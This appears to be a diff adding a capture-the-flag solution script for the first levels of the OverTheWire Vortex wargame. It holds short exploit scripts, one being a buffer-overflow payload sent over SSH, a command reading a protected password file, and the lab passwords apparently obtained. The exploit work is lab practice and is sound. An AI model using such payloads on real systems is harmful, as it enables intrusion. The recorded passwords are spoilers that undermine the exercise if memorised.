@@ -1,0 +1,27 @@
+import zio
+addr = ("vortex.labs.overthewire.org", 5842)
+io = zio.zio(addr)
+i = zio.l32(io.read(4))
+i += zio.l32(io.read(4))
+i += zio.l32(io.read(4))
+i += zio.l32(io.read(4))
+io.write(zio.l32(i))
+io.interact()
+
+#Gq#qu3bF3
+import zio
+io = zio.zio("ssh -t -t vortex1@vortex.labs.overthewire.org")
+io.TIMEOUT = 20
+io.read_until(["~$ "])
+io.writeline("/vortex/vortex1")
+payload = "\\"*0x105 + "\xca\xca"
+io.write(payload)
+io.interact()
+
+#23anbT\rE
+#vortex2@melinda:/vortex$ ./vortex2 /etc/vortex_pass/vortex3
+#vortex2@melinda:/vortex$ cat '/tmp/ownership.$$.tar'
+
+#vortex3
+#64ncXTvx#
+
